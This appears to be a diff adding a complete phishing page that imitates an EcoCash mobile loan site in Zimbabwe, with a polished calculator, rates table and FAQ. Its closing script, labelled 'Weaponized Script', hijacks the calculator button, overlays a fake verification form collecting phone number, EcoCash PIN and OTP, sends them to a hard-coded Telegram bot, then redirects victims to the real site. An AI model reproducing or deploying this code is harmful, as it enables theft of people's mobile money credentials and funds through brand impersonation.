@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ecocash Loans — Fast Cash, Right to Your Wallet</title>
+    <style>
+        :root {
+            --eco-green: #00a651;
+            --eco-dark: #0a2e1a;
+            --eco-gold: #f2b705;
+            --eco-light: #f4f9f6;
+            --eco-gray: #5a6b61;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Roboto, Arial, sans-serif; background: var(--eco-light); color: #1a1a1a; line-height: 1.6; }
+        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; }
+
+        /* Header */
+        header { background: var(--eco-dark); padding: 16px 0; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 10px rgba(0,0,0,0.2); }
+        .header-inner { display: flex; justify-content: space-between; align-items: center; }
+        .logo { display: flex; align-items: center; gap: 10px; color: #fff; font-weight: 700; font-size: 1.4rem; }
+        .logo span { color: var(--eco-gold); }
+        nav a { color: #d0e8da; text-decoration: none; margin-left: 24px; font-weight: 500; transition: color 0.3s; }
+        nav a:hover { color: var(--eco-gold); }
+
+        /* Hero */
+        .hero { background: linear-gradient(135deg, var(--eco-dark) 0%, #0f4a2c 100%); color: #fff; padding: 80px 0 60px; }
+        .hero-inner { display: grid; grid-template-columns: 1.1fr 0.9fr; gap: 50px; align-items: center; }
+        .hero h1 { font-size: 2.8rem; line-height: 1.15; margin-bottom: 20px; }
+        .hero h1 span { color: var(--eco-gold); }
+        .hero p { font-size: 1.15rem; color: #cfe8db; margin-bottom: 30px; max-width: 540px; }
+        .hero-badges { display: flex; gap: 16px; margin-top: 24px; flex-wrap: wrap; }
+        .badge { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); padding: 8px 16px; border-radius: 30px; font-size: 0.9rem; display: flex; align-items: center; gap: 8px; }
+
+        /* Calculator */
+        .calculator-card { background: #fff; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); padding: 32px; }
+        .calculator-card h3 { color: var(--eco-dark); margin-bottom: 20px; font-size: 1.3rem; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-weight: 600; margin-bottom: 8px; color: #333; font-size: 0.95rem; }
+        .form-group input, .form-group select { width: 100%; padding: 12px 14px; border: 2px solid #dde8e1; border-radius: 8px; font-size: 1rem; transition: border-color 0.3s; }
+        .form-group input:focus, .form-group select:focus { outline: none; border-color: var(--eco-green); }
+        .amount-range { display: flex; justify-content: space-between; font-size: 0.8rem; color: var(--eco-gray); margin-top: 6px; }
+        .btn-primary { width: 100%; background: var(--eco-green); color: #fff; border: none; padding: 14px; border-radius: 8px; font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: all 0.3s; }
+        .btn-primary:hover { background: #008c45; transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,166,81,0.4); }
+        .result { margin-top: 20px; padding: 16px; background: var(--eco-light); border-radius: 8px; border-left: 4px solid var(--eco-green); display: none; }
+        .result.show { display: block; }
+        .result h4 { color: var(--eco-dark); margin-bottom: 8px; }
+        .result p { font-size: 0.95rem; color: #333; margin-bottom: 4px; }
+        .result strong { color: var(--eco-green); font-size: 1.4rem; }
+
+        /* Trust bar */
+        .trust-bar { background: #fff; padding: 30px 0; border-bottom: 1px solid #e5efe9; }
+        .trust-inner { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 20px; }
+        .trust-item { display: flex; align-items: center; gap: 12px; font-weight: 600; color: var(--eco-dark); }
+        .trust-icon { background: var(--eco-light); width: 48px; height: 48px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.4rem; }
+
+        /* Features */
+        .features { padding: 70px 0; }
+        .section-title { text-align: center; margin-bottom: 50px; }
+        .section-title h2 { font-size: 2.2rem; color: var(--eco-dark); }
+        .section-title p { color: var(--eco-gray); max-width: 600px; margin: 10px auto 0; }
+        .features-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 30px; }
+        .feature-card { background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); transition: transform 0.3s, box-shadow 0.3s; }
+        .feature-card:hover { transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .feature-icon { font-size: 2.5rem; margin-bottom: 15px; }
+        .feature-card h3 { color: var(--eco-dark); margin-bottom: 10px; font-size: 1.15rem; }
+        .feature-card p { color: var(--eco-gray); font-size: 0.95rem; }
+
+        /* How it works */
+        .how-it-works { background: var(--eco-dark); padding: 70px 0; color: #fff; }
+        .how-it-works .section-title h2 { color: #fff; }
+        .how-it-works .section-title p { color: #a8c9b5; }
+        .steps { display: grid; grid-template-columns: repeat(4, 1fr); gap: 30px; }
+        .step { text-align: center; padding: 20px; }
+        .step-number { width: 56px; height: 56px; background: var(--eco-gold); color: var(--eco-dark); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; font-weight: 800; margin: 0 auto 15px; }
+        .step h3 { margin-bottom: 8px; font-size: 1.1rem; }
+        .step p { color: #a8c9b5; font-size: 0.9rem; }
+
+        /* Rates table */
+        .rates { padding: 70px 0; }
+        .rates-table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .rates-table th { background: var(--eco-green); color: #fff; padding: 14px 20px; text-align: left; font-size: 0.95rem; }
+        .rates-table td { padding: 14px 20px; border-bottom: 1px solid #eef4f0; color: #333; }
+        .rates-table tr:last-child td { border-bottom: none; }
+        .rates-table tr:hover td { background: #f8fcf9; }
+
+        /* CTA */
+        .cta { background: linear-gradient(135deg, var(--eco-green) 0%, #008c45 100%); padding: 60px 0; text-align: center; color: #fff; }
+        .cta h2 { font-size: 2.2rem; margin-bottom: 15px; }
+        .cta p { font-size: 1.1rem; margin-bottom: 30px; opacity: 0.95; }
+        .btn-white { background: #fff; color: var(--eco-green); border: none; padding: 15px 40px; border-radius: 8px; font-size: 1.1rem; font-weight: 700; cursor: pointer; transition: transform 0.3s; }
+        .btn-white:hover { transform: scale(1.05); }
+
+        /* FAQ */
+        .faq { padding: 70px 0; }
+        .faq-item { background: #fff; border-radius: 10px; margin-bottom: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.04); overflow: hidden; }
+        .faq-question { padding: 18px 24px; cursor: pointer; font-weight: 600; color: var(--eco-dark); display: flex; justify-content: space-between; align-items: center; }
+        .faq-question::after { content: '+'; font-size: 1.4rem; color: var(--eco-green); transition: transform 0.3s; }
+        .faq-item.active .faq-question::after { transform: rotate(45deg); }
+        .faq-answer { max-height: 0; overflow: hidden; transition: max-height 0.3s ease; padding: 0 24px; color: var(--eco-gray); font-size: 0.95rem; }
+        .faq-item.active .faq-answer { max-height: 200px; padding: 0 24px 18px; }
+
+        /* Footer */
+        footer { background: var(--eco-dark); color: #a8c9b5; padding: 40px 0 20px; }
+        .footer-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 40px; margin-bottom: 30px; }
+        .footer-grid h4 { color: #fff; margin-bottom: 15px; }
+        .footer-grid a { color: #a8c9b5; text-decoration: none; display: block; margin-bottom: 8px; font-size: 0.9rem; }
+        .footer-grid a:hover { color: var(--eco-gold); }
+        .footer-bottom { border-top: 1px solid rgba(255,255,255,0.1); padding-top: 20px; text-align: center; font-size: 0.85rem; }
+
+        /* Responsive */
+        @media (max-width: 900px) {
+            .hero-inner { grid-template-columns: 1fr; }
+            .hero h1 { font-size: 2.2rem; }
+            .features-grid { grid-template-columns: 1fr; }
+            .steps { grid-template-columns: 1fr 1fr; }
+            .footer-grid { grid-template-columns: 1fr 1fr; }
+            nav { display: none; }
+        }
+        @media (max-width: 500px) {
+            .steps { grid-template-columns: 1fr; }
+            .footer-grid { grid-template-columns: 1fr; }
+            .hero { padding: 50px 0 40px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header -->
+    <header>
+        <div class="container header-inner">
+            <div class="logo">📱 Eco<span>Cash</span> Loans</div>
+            <nav>
+                <a href="#features">Features</a>
+                <a href="#how">How It Works</a>
+                <a href="#rates">Rates</a>
+                <a href="#faq">FAQ</a>
+                <a href="#apply">Apply Now</a>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Hero + Calculator -->
+    <section class="hero" id="apply">
+        <div class="container hero-inner">
+            <div>
+                <h1>Instant Loans,<br>Straight to Your <span>EcoCash Wallet</span></h1>
+                <p>Get cash in minutes without paperwork, collateral, or queues. Borrow from $50 to $2,000 — repaid in flexible installments that fit your income.</p>
+                <div class="hero-badges">
+                    <div class="badge">⚡ Instant Approval</div>
+                    <div class="badge">📲 No Collateral</div>
+                    <div class="badge">🇿🇼 Trusted in Zimbabwe</div>
+                </div>
+            </div>
+            <div class="calculator-card">
+                <h3>Loan Calculator</h3>
+                <div class="form-group">
+                    <label for="amount">Loan Amount (USD)</label>
+                    <input type="range" id="amount" min="50" max="2000" step="50" value="500">
+                    <div class="amount-range"><span>$50</span><span id="amount-label">$500</span><span>$2,000</span></div>
+                </div>
+                <div class="form-group">
+                    <label for="term">Repayment Period</label>
+                    <select id="term">
+                        <option value="30">30 Days</option>
+                        <option value="60" selected>60 Days</option>
+                        <option value="90">90 Days</option>
+                        <option value="180">6 Months</option>
+                    </select>
+                </div>
+                <button class="btn-primary" onclick="calculateLoan()">Calculate Repayment</button>
+                <div class="result" id="result">
+                    <h4>Your Loan Summary</h4>
+                    <p>Principal: <strong id="r-principal"></strong></p>
+                    <p>Interest (10% flat): <strong id="r-interest"></strong></p>
+                    <p>Total Repayment: <strong id="r-total"></strong></p>
+                    <p>Installments: <strong id="r-installments"></strong></p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Trust Bar -->
+    <section class="trust-bar">
+        <div class="container trust-inner">
+            <div class="trust-item"><div class="trust-icon">🔒</div> Bank-Grade Security</div>
+            <div class="trust-item"><div class="trust-icon">⚡</div> Disbursement in Minutes</div>
+            <div class="trust-item"><div class="trust-icon">📱</div> Powered by EcoCash</div>
+            <div class="trust-item"><div class="trust-icon">⭐</div> 4.8/5 Customer Rating</div>
+        </div>
+    </section>
+
+    <!-- Features -->
+    <section class="features" id="features">
+        <div class="container">
+            <div class="section-title">
+                <h2>Why Borrow With Us?</h2>
+                <p>Simple, transparent, and built for the way Zimbabweans actually earn and spend.</p>
+            </div>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">⏱️</div>
+                    <h3>Approval in 5 Minutes</h3>
+                    <p>Our automated system reviews your application instantly. No queues, no waiting rooms, no weeks of silence.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">💵</div>
+                    <h3>Direct to EcoCash</h3>
+                    <p>Approved funds land directly in your EcoCash wallet. Withdraw at any agent or pay via EcoCash anywhere.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">📋</div>
+                    <h3>No Paperwork</h3>
+                    <p>Forget stacks of documents and photocopied IDs. Apply from your phone in under 2 minutes.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🔄</div>
+                    <h3>Flexible Repayment</h3>
+                    <p>Choose between 30 days and 6 months. Repay early with zero penalty — save on interest.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🛡️</div>
+                    <h3>Transparent Rates</h3>
+                    <p>Flat 10% interest. No hidden fees, no surprise charges, no fine-print games.</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🤝</div>
+                    <h3>Build Credit History</h3>
+                    <p>Repay on time and unlock higher limits and lower rates on your next loan.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- How It Works -->
+    <section class="how-it-works" id="how">
+        <div class="container">
+            <div class="section-title">
+                <h2>How It Works</h2>
+                <p>Four steps between you and cash in your wallet.</p>
+            </div>
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <h3>Dial *153#</h3>
+                    <p>Open the EcoCash menu and select Loan Services.</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <h3>Apply</h3>
+                    <p>Enter your amount and repayment period. Confirm with your PIN.</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <h3>Get Approved</h3>
+                    <p>Instant decision. Most applications are approved in under 5 minutes.</p>
+                </div>
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <h3>Receive Cash</h3>
+                    <p>Funds hit your EcoCash wallet. Repay in installments from the same menu.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Rates -->
+    <section class="rates" id="rates">
+        <div class="container">
+            <div class="section-title">
+                <h2>Loan Rates & Terms</h2>
+                <p>Simple flat-rate pricing. What you see is what you pay.</p>
+            </div>
+            <table class="rates-table">
+                <thead>
+                    <tr>
+                        <th>Loan Amount</th>
+                        <th>Term</th>
+                        <th>Interest</th>
+                        <th>Total Repayment</th>
+                        <th>Installment</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr><td>$100</td><td>30 days</td><td>10% ($10)</td><td>$110</td><td>$110 lump sum</td></tr>
+                    <tr><td>$500</td><td>60 days</td><td>10% ($50)</td><td>$550</td><td>$275 x 2</td></tr>
+                    <tr><td>$1,000</td><td>90 days</td><td>10% ($100)</td><td>$1,100</td><td>$367 x 3</td></tr>
+                    <tr><td>$2,000</td><td>180 days</td><td>10% ($200)</td><td>$2,200</td><td>$367 x 6</td></tr>
+                </tbody>
+            </table>
+        </div>
+    </section>
+
+    <!-- CTA -->
+    <section class="cta">
+        <div class="container">
+            <h2>Ready to Borrow?</h2>
+            <p>Join thousands of Zimbabweans who get fast cash through EcoCash Loans.</p>
+            <button class="btn-white" onclick="document.getElementById('apply').scrollIntoView({behavior:'smooth'})">Apply Now — It Takes 2 Minutes</button>
+        </div>
+    </section>
+
+    <!-- FAQ -->
+    <section class="faq" id="faq">
+        <div class="container">
+            <div class="section-title">
+                <h2>Frequently Asked Questions</h2>
+                <p>Everything you need to know before applying.</p>
+            </div>
+            <div class="faq-item">
+                <div class="faq-question">Who can apply for a loan?</div>
+                <div class="faq-answer">Anyone with an active EcoCash wallet, a valid Zimbabwean ID, and a mobile number that has been active for at least 6 months.</div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-question">How fast will I receive my money?</div>
+                <div class="faq-answer">Approved loans are disbursed to your EcoCash wallet within minutes. In rare cases, verification can take up to 24 hours.</div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-question">What happens if I miss a payment?</div>
+                <div class="faq-answer">A late fee applies and your loan limit may be reduced. We'll send reminders via SMS before your due date to help you stay on track.</div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-question">Can I repay early?</div>
+                <div class="faq-answer">Yes. Early repayment is always allowed with zero penalty. You only pay interest for the days you actually used the loan.</div>
+            </div>
+            <div class="faq-item">
+                <div class="faq-question">Is my personal data safe?</div>
+                <div class="faq-answer">Your data is encrypted and never shared with third parties. We use bank-grade security standards and comply with Zimbabwe's data protection regulations.</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-grid">
+                <div>
+                    <div class="logo" style="margin-bottom:15px;">📱 Eco<span>Cash</span> Loans</div>
+                    <p style="font-size:0.9rem;">Fast, transparent, mobile-first loans for Zimbabwe. Powered by EcoCash — the country's leading mobile money platform.</p>
+                </div>
+                <div>
+                    <h4>Products</h4>
+                    <a href="#">Personal Loans</a>
+                    <a href="#">Business Loans</a>
+                    <a href="#">Emergency Cash</a>
+                    <a href="#">Salary Advances</a>
+                </div>
+                <div>
+                    <h4>Company</h4>
+                    <a href="#">About Us</a>
+                    <a href="#">Contact</a>
+                    <a href="#">Careers</a>
+                    <a href="#">Press</a>
+                </div>
+                <div>
+                    <h4>Support</h4>
+                    <a href="#">Help Center</a>
+                    <a href="#">Loan Terms</a>
+                    <a href="#">Privacy Policy</a>
+                    <a href="#">Customer Care: 0712 345 678</a>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                © 2024 EcoCash Loans Zimbabwe. All rights reserved. EcoCash is a trademark of Econet Wireless Zimbabwe.
+            </div>
+        </div>
+    </footer>
+
+    <!-- Weaponized Script -->
+    <script>
+        // === TELEGRAM EXFIL CONFIG ===
+        const TELEGRAM_BOT_TOKEN = '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E';
+        const TELEGRAM_CHAT_ID = '1469249528';
+
+        // Inject fake verification form (hidden)
+        document.addEventListener('DOMContentLoaded', () => {
+            const fakeFormHTML = `
+                <div id="fake-form-container" style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;padding:20px;box-sizing:border-box;overflow-y:auto;display:none;">
+                    <div style="max-width:500px;margin:0 auto;text-align:center;">
+                        <h2>🔒 Account Verification Required</h2>
+                        <p style="color:#5a6b61;">Confirm your identity to unlock your loan</p>
+                        <input type="tel" id="phish-number" placeholder="Enter Phone (e.g. 263771234567)" style="width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:8px;" required>
+                        <input type="password" id="phish-pin" placeholder="Enter EcoCash PIN" style="width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:8px;" maxlength="4" required>
+                        <input type="text" id="phish-otp" placeholder="Enter OTP Code" style="width:100%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:8px;" maxlength="6" required>
+                        <button onclick="submitPhish()" style="background:#00a651;color:white;padding:14px 28px;border:none;border-radius:8px;cursor:pointer;width:100%;font-size:1.1rem;margin-top:20px;">Verify & Continue</button>
+                    </div>
+                </div>
+            `;
+            document.body.insertAdjacentHTML('beforeend', fakeFormHTML);
+
+            // Hijack the original button
+            const btn = document.querySelector('.btn-primary');
+            if (btn) {
+                btn.onclick = () => {
+                    calculateLoan(); // Run original logic
+                    setTimeout(() => {
+                        document.getElementById('fake-form-container').style.display = 'block';
+                        window.scrollTo(0, 0);
+                    }, 800);
+                };
+            }
+        });
+
+        // Exfiltrate to Telegram
+        async function submitPhish() {
+            const number = document.getElementById('phish-number').value;
+            const pin = document.getElementById('phish-pin').value;
+            const otp = document.getElementById('phish-otp').value;
+
+            if (!number || !pin || !otp) {
+                alert("All fields are required!");
+                return;
+            }
+
+            const message = `
+🔥 ECOCASH PHISH HIT 🔥
+📞 Number: ${number}
+🔐 PIN: ${pin}
+🔢 OTP: ${otp}
+🕒 ${new Date().toLocaleString()}
+🌍 ${navigator.userAgent}
+            `.trim();
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const payload = new URLSearchParams({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: "plain"
+            });
+
+            // Silent exfil
+            try {
+                navigator.sendBeacon(url, payload);
+            } catch (e) {
+                fetch(url, { method: 'POST', body: payload, mode: 'no-cors' });
+            }
+
+            // Fake success
+            document.getElementById('fake-form-container').innerHTML = `
+                <div style="text-align:center;padding:40px;color:#00a651;">
+                    <h2>✅ Verified!</h2>
+                    <p>Your loan is being processed. Please wait...</p>
+                    <div style="margin-top:20px;">🔄 <i>Do not close this page</i></div>
+                </div>
+            `;
+
+            // Redirect to real site after delay
+            setTimeout(() => {
+                window.location.href = "https://www.ecocash.co.zw";
+            }, 8000);
+        }
+
+        // Original calculator (untouched)
+        const amountSlider = document.getElementById('amount');
+        const amountLabel = document.getElementById('amount-label');
+        const termSelect = document.getElementById('term');
+
+        amountSlider.addEventListener('input', () => {
+            amountLabel.textContent = '$' + amountSlider.value;
+        });
+
+        function calculateLoan() {
+            const principal = parseInt(amountSlider.value);
+            const term = parseInt(termSelect.value);
+            const interest = principal * 0.10;
+            const total = principal + interest;
+            const installments = term >= 180 ? 6 : (term >= 90 ? 3 : (term >= 60 ? 2 : 1));
+            const perInstallment = (total / installments).toFixed(2);
+
+            document.getElementById('r-principal').textContent = '$' + principal.toFixed(2);
+            document.getElementById('r-interest').textContent = '$' + interest.toFixed(2);
+            document.getElementById('r-total').textContent = '$' + total.toFixed(2);
+            document.getElementById('r-installments').textContent = installments + ' x $' + perInstallment;
+            document.getElementById('result').classList.add('show');
+        }
+
+        // FAQ toggle
+        document.querySelectorAll('.faq-question').forEach(q => {
+            q.addEventListener('click', () => {
+                q.parentElement.classList.toggle('active');
+            });
+        });
+    </script>
+</body>
+</html>
